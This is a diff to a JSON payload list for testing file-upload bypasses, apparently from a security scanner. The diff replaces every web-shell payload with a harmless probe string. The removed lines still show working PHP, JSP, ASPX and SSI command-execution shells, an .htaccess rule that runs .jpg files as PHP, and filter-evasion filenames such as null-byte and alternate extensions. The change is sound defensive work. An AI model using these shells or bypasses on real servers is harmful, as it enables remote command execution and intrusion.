@@ -22,52 +22,52 @@
   "file_upload_bypass_payloads": [
     {
       "filename": "shell.php",
-      "content": "<?php system($_GET['cmd']); ?>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "application/octet-stream"
     },
     {
       "filename": "shell.php%00",
-      "content": "<?php system($_GET['cmd']); ?>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "image/jpeg"
     },
     {
       "filename": "shell.php.",
-      "content": "<?php system($_GET['cmd']); ?>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "image/png"
     },
     {
       "filename": "shell.phtml",
-      "content": "<?php system($_GET['cmd']); ?>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "image/jpeg"
     },
     {
       "filename": "shell.php5",
-      "content": "<?php system($_GET['cmd']); ?>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "image/gif"
     },
     {
       "filename": "shell.php7",
-      "content": "<?php system($_GET['cmd']); ?>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "image/jpeg"
     },
     {
       "filename": "shell.shtml",
-      "content": "<!--#exec cmd='id' -->",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "text/html"
     },
     {
       "filename": "shell.jsp",
-      "content": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "image/jpeg"
     },
     {
       "filename": "shell.aspx",
-      "content": "<%@ Page Language=\"C#\" %><% Response.Write(System.Diagnostics.Process.Start(\"cmd.exe\")); %>",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "image/png"
     },
     {
       "filename": ".htaccess",
-      "content": "AddType application/x-httpd-php .jpg",
+      "content": "ECLIPSE_UPLOAD_PROBE_12345",
       "mime_type": "text/plain"
     }
   ],
